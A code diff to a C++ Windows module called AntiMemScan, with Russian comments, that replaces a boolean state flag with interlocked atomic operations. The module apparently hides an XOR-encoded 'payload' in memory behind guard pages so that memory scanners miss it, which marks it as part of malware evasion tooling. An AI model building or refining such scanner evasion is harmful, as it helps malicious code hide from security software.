@@ -10,10 +10,11 @@
 
 #include "AntiMemScan.h"
 #include "GuardPage.h"
+#include <winnt.h>
 
 namespace AntiMemScan
 {
-    static bool s_Active = false;
+    static volatile LONG s_Active = 0;
     static void*  s_PayloadBase = nullptr;
     static size_t s_PayloadSize = 0;
 
@@ -48,7 +49,7 @@ namespace AntiMemScan
     bool Enable(void* payloadBase, size_t payloadSize,
                 unsigned char* xorKey, size_t keyLen)
     {
-        if (s_Active) return true;
+        if (InterlockedCompareExchange(&s_Active, 0, 0) != 0) return true;
         if (!payloadBase || payloadSize == 0) return false;
 
         s_PayloadBase = payloadBase;
@@ -68,25 +69,25 @@ namespace AntiMemScan
         // AntiMemScan::Disable() снимает Layer 3 перед выполнением,
         // после чего execution method обеспечивает Layer 1/2.
 
-        s_Active = true;
-        return s_Active;
+        InterlockedExchange(&s_Active, 1);
+        return InterlockedCompareExchange(&s_Active, 0, 0) != 0;
     }
 
     // ═══ Отключение защиты ═══
     void Disable()
     {
-        if (!s_Active) return;
+        if (InterlockedCompareExchange(&s_Active, 0, 0) == 0) return;
 
         GuardPage::Uninstall();
 
         s_PayloadBase = nullptr;
         s_PayloadSize = 0;
-        s_Active = false;
+        InterlockedExchange(&s_Active, 0);
     }
 
     // ═══ Запрос состояния ═══
     bool IsActive()
     {
-        return s_Active;
+        return InterlockedCompareExchange(&s_Active, 0, 0) != 0;
     }
 }
